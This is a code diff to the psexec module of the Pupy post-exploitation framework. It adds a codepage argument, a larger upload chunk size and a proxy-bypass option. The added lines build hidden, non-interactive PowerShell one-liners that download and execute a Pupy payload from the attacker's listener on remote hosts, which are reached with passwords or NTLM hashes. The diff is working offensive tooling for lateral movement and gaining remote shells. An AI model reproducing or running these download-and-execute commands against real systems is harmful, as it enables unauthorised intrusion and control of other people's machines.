@@ -29,6 +29,7 @@ class PSExec(PupyModule):
         self.arg_parser = PupyArgumentParser(prog="psexec", description=self.__doc__)
         self.arg_parser.add_argument("-u", metavar="USERNAME", dest='user', default='', help="Username, if omitted null session assumed")
         self.arg_parser.add_argument("-p", metavar="PASSWORD", dest='passwd', default='', help="Password")
+        self.arg_parser.add_argument("-c", metavar="CODEPAGE", dest='codepage', default='cp437', help="Codepage")
         self.arg_parser.add_argument("-H", metavar="HASH", dest='hash', default='', help='NTLM hash')
         self.arg_parser.add_argument("-d", metavar="DOMAIN", dest='domain', default="WORKGROUP", help="Domain name (default WORKGROUP)")
         self.arg_parser.add_argument("-s", metavar="SHARE", dest='share', default="C$", help="Specify a share (default C$)")
@@ -42,6 +43,7 @@ class PSExec(PupyModule):
         sgroupp = self.arg_parser.add_argument_group("Command Execution", "Get a remote shell")
         sgroupp.add_argument('--ps1-oneliner', action='store_true', default=False, help="Download and execute pupy using ps1_oneline")
         sgroupp.add_argument('--ps1-port', default=8080, type=int, help="Custom port used by the listening server (used with --ps1-oneliner, default: 8080)")
+        sgroupp.add_argument('--no-use-proxy', action='store_true', default=None, help="Don't use the target's proxy configuration even if it is used by target")
         sgroupp.add_argument("--ps1",  action='store_true', default=False, help="Upload and execute a powershell file to get a pupy session")
         sgroupp.add_argument("--file", dest="file", default=None, help="Upload and execute an exe file")
 
@@ -109,14 +111,21 @@ class PSExec(PupyModule):
                 dst = remote_path + file
 
                 self.info("Uploading file to {0}".format(dst))
-                upload(self.client.conn, src, dst)
+                upload(self.client.conn, src, dst, chunk_size=4*1024*1024)
                 self.success("File uploaded")
 
         if args.ps1_oneliner:
             res=self.client.conn.modules['pupy'].get_connect_back_host()
             ip, port = res.rsplit(':', 1)
 
-            cmd = '%s/pupygen.py -f ps1_oneliner --ps1-oneliner-listen-port %s connect --host %s:%s' % (os.getcwd(), str(args.ps1_port), ip, port)
+            no_use_proxy = ''
+            if args.no_use_proxy:
+                no_use_proxy = '--no-use-proxy'
+                args.command = 'powershell.exe -w hidden -noni -nop -c "$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();iex($w.DownloadString(\'http://%s:%s/eiloShaegae1\'));"' % (ip, str(args.ps1_port))
+            else:
+                args.command = 'powershell.exe -w hidden -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString(\'http://%s:%s/eiloShaegae1\')"' % (ip, str(args.ps1_port))
+
+            cmd = '%s/pupygen.py -f ps1_oneliner %s --ps1-oneliner-listen-port %s connect --host %s:%s' % (os.getcwd(), no_use_proxy, str(args.ps1_port), ip, port)
             self.warning('starting the local server')
             process = Popen(cmd.split(' '), stdout=PIPE, stderr=PIPE, stdin=PIPE)
             time.sleep(2)
@@ -127,12 +136,15 @@ class PSExec(PupyModule):
                 return
 
             self.success('server started (pid: %s)' % process.pid)
-            args.command = 'powershell.exe -w hidden -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString(\'http://%s:%s/eiloShaegae1\')"' % (ip, str(args.ps1_port))
 
         with redirected_stdo(self):
             for host in hosts:
                 self.info("Connecting to the remote host: %s" % host)
-                self.client.conn.modules["pupyutils.psexec"].connect(host, args.port, args.user, args.passwd, args.hash, args.share, file_to_upload, remote_path, dst_folder, args.command, args.domain, args.execm)
+                self.client.conn.modules["pupyutils.psexec"].connect(
+                    host, args.port, args.user, args.passwd, args.hash,
+                    args.share, file_to_upload, remote_path, dst_folder,
+                    args.command, args.domain, args.execm, args.codepage
+                )
 
             if args.ps1_oneliner:
                 self.warning('stopping the local server (pid: %s)' % process.pid)
